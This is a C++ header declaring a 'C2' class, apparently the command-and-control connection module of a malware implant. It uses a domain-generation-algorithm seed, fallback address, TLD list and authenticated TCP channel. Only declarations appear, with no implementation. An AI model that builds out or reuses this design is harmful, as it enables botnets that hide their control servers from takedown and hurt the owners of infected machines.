#pragma once
#include "../types/types.h"
#include "../logging/logging.h"
#include "dga.h"
#include "../net/packet.h"
#include "../utils/rand.h"
#include <asio.hpp>
#include <thread>

class C2 {
public:
	
	C2::C2(const int dga, const char* fba, const stringvec& tlds, const char* port, const char* id) : dgaseed{ dga }, fallbackaddr{ fba }, topleveldomains{ tlds }, port{ port }, id{id} , mysocket{ asio_context } {}
	
	bool is_alive();
	void find_and_connect_async();
	bool find_and_connect();
	void send_packet(netpack::Packet& p);
	netpack::Packet recv_packet();

private:
	std::string get_basedomain();
	bool authenticate();
	void receive_thread();

	int dgaseed = 0;
	bool socket_open = false;
	const char* fallbackaddr;
	const char* port;
	const char* id;
	stringvec topleveldomains;

	asio::io_context asio_context;
	asio::ip::tcp::socket mysocket;
};